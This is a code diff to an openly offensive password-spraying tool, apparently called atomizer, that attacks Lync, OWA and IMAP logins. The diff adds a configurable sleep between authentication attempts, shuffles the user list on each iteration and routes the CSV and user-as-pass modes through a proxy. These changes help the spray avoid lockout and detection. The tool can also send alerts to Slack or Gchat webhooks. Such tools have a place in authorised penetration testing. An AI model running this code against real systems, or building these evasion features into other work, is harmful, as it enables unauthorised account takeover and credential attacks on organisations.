@@ -2,11 +2,11 @@
 
 """
 Usage:
-    atomizer (lync|owa|imap) <target> <password> <userfile> [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--debug]
-    atomizer (lync|owa|imap) <target> <passwordfile> <userfile> --interval <TIME> [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT][--threads THREADS] [--debug]
-    atomizer (lync|owa|imap) <target> --csvfile CSVFILE [--user-row-name NAME] [--pass-row-name NAME] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--debug]
-    atomizer (lync|owa|imap) <target> --user-as-pass USERFILE [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--debug]
-    atomizer (lync|owa|imap) <target> --recon [--debug] [--proxy PROXY]
+    atomizer (lync|owa|imap) <target> <password> <userfile> [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--sleep SECONDS] [--debug] [--shuffle]
+    atomizer (lync|owa|imap) <target> <passwordfile> <userfile> --interval <TIME> [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--sleep SECONDS] [--debug] [--shuffle]
+    atomizer (lync|owa|imap) <target> --csvfile CSVFILE [--user-row-name NAME] [--pass-row-name NAME] [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--sleep SECONDS] [--debug] [--shuffle]
+    atomizer (lync|owa|imap) <target> --user-as-pass USERFILE [--gchat <URL>] [--slack <URL>] [--proxy PROXY] [--targetPort PORT] [--threads THREADS] [--sleep SECONDS] [--debug] [--shuffle]
+    atomizer (lync|owa|imap) <target> --recon [--debug] [--proxy PROXY] [--shuffle]
     atomizer -h | --help
     atomizer -v | --version
 
@@ -21,11 +21,13 @@ Options:
     -v, --version            show version
     -c, --csvfile CSVFILE    csv file containing usernames and passwords
     -i, --interval TIME      spray at the specified interval [format: "H:M:S"]
+    -s, --sleep SECONDS      sleep after each authentication attempt [default: 5]
     -t, --threads THREADS    number of concurrent threads to use [default: 3]
     -d, --debug              enable debug output
     -p, --targetPort PORT    target port of the IMAP server (IMAP only) [default: 993]
     -x, --proxy PROXY        use proxy on requests
     --recon                  only collect info, don't password spray
+    --shuffle                shuffle user list in each iteration
     --gchat URL              gchat webhook url for notification
     --slack URL              slack webhook url for notification
     --user-row-name NAME     username row title in CSV file [default: Email Address]
@@ -39,6 +41,7 @@ import asyncio
 import concurrent.futures
 import sys
 import csv
+import random
 from functools import partial
 from pathlib import Path
 from docopt import docopt
@@ -49,12 +52,14 @@ from core.webhooks import gchat, slack
 
 
 class Atomizer:
-    def __init__(self, loop, target, threads=3, debug=False, proxy=None):
+    def __init__(self, loop, target, threads=3, debug=False, proxy=None, shuffle=False, sleep=5):
         self.loop = loop
         self.target = target
         self.sprayer = None
         self.threads = int(threads)
         self.debug = debug
+        self.shuffle = shuffle
+        self.sleep = int(sleep)
         if proxy is None:
             self.proxy = None
         else:
@@ -92,7 +97,7 @@ class Atomizer:
             port=port
         )
 
-    async def atomize(self, userfile, password):
+    async def atomize(self, userlist, password, shuffle):
         log = logging.getLogger('atomize')
         log.debug('atomizing...')
 
@@ -100,9 +105,13 @@ class Atomizer:
 
         log.debug('creating executor tasks')
         logging.info(print_info(f"Starting spray at {get_utc_time()} UTC"))
+
+        if shuffle:
+            log.debug('randomizing user list')
+            random.shuffle(userlist)
         blocking_tasks = [
-            self.loop.run_in_executor(self.executor, partial(auth_function, username=username.strip(), password=password, proxy=self.proxy))
-            for username in userfile
+            self.loop.run_in_executor(self.executor, partial(auth_function, username=username.strip(), password=password, proxy=self.proxy, sleep=self.sleep))
+            for username in userlist
         ]
         log.debug('waiting for executor tasks')
         await asyncio.wait(blocking_tasks)
@@ -117,7 +126,7 @@ class Atomizer:
         log.debug('creating executor tasks')
         logging.info(print_info(f"Starting spray at {get_utc_time()} UTC"))
         blocking_tasks = [
-            self.loop.run_in_executor(self.executor, partial(auth_function, username=row[user_row_name], password=row[pass_row_name]))
+            self.loop.run_in_executor(self.executor, partial(auth_function, username=row[user_row_name], password=row[pass_row_name], proxy=self.proxy, sleep=self.sleep))
             for row in csvreader
         ]
 
@@ -134,7 +143,7 @@ class Atomizer:
         log.debug('creating executor tasks')
         logging.info(print_info(f"Starting spray at {get_utc_time()} UTC"))
         blocking_tasks = [
-            self.loop.run_in_executor(self.executor, partial(auth_function, username=username.strip(), password=username.strip().split('\\')[-1:][0]))
+            self.loop.run_in_executor(self.executor, partial(auth_function, username=username.strip(), password=username.strip().split('\\')[-1:][0], proxy=self.proxy, sleep=self.sleep))
             for username in userfile
         ]
 
@@ -162,7 +171,9 @@ if __name__ == "__main__":
         target=args['<target>'].lower(),
         threads=args['--threads'],
         debug=args['--debug'],
-        proxy=args['--proxy']
+        proxy=args['--proxy'],
+        shuffle=args['--shuffle'],
+        sleep=args['--sleep'],
     )
 
     logging.debug(args)
@@ -189,10 +200,12 @@ if __name__ == "__main__":
                 password = passwordfile.readline()
                 while password != "":
                     with open(args['<userfile>']) as userfile:
+                            userlist = userfile.read().splitlines()
                             loop.run_until_complete(
                                 atomizer.atomize(
-                                    userfile=userfile,
-                                    password=password.strip()
+                                    userlist=userlist,
+                                    password=password.strip(),
+                                    shuffle=args['--shuffle']
                                 )
                             )
 
@@ -213,10 +226,12 @@ if __name__ == "__main__":
 
         elif args['<userfile>']:
             with open(args['<userfile>']) as userfile:
+                    userlist = userfile.read().splitlines()
                     loop.run_until_complete(
                         atomizer.atomize(
-                            userfile=userfile,
-                            password=args['<password>']
+                            userlist=userlist,
+                            password=args['<password>'],
+                            shuffle=args['--shuffle']
                         )
                     )
                     if popped_accts != len(atomizer.sprayer.valid_accounts):
